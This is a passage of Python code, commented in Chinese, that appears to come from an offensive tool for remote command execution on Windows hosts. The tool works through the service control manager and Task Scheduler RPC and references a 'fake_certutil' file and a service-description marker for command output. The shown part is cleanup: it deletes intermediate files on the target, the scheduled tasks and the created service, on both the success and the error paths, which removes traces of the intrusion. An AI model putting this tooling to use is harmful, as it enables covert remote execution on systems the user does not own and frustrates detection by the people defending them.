        print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++')


    #删除中间文件
    delete_inter_file(bat_file_name,copied_xml_file_name=xml_file_name,file_part_1_name=file_part_1_name,
                      desc_header_file_name=desc_header_file_name,desc_tail_file_name=desc_tail_file_name,
                      cmd_result_file_name=cmd_result_file_name,new_xml_file=new_xml_file,
                      sch_backup_filename=sch_backup_filename,    fake_certutil_name = fake_certutil_name,
                      split_out_dir_on_target=split_out_dir_on_target,
                      servicename=lpServiceName,hService=hService,svcctl=svcctl,tschctl=tschctl,
                      ps_file_name=ps_file_name,
                      schtasks_name=schtasks_name,service_desc_marker=service_desc_marker)
    # 删除bat文件产生的bat文件
    # delete_bat_gen_file(bat_gen_bat_prefix,schtasks_name=schtasks_name,servicename=lpServiceName,hService=hService,svcctl=svcctl,tschctl=tschctl)

    #删除计划任务
    tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name)
    tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name_for_upload)


    hRDeleteService(svcctl,hService)


    # 关闭句柄
    hRCloseServiceHandle(svcctl,scManagerHandle)
    #
    svcctl.disconnect()
    tschctl.disconnect()
except Exception as e:
    print('[-] error occurred')
    print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    print(e)
    print(traceback.format_exc())
    print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    print('[*] clearing')
    tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name)
    tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name_for_upload)
    hRDeleteService(svcctl, hService)

    # 关闭句柄
    hRCloseServiceHandle(svcctl, scManagerHandle)
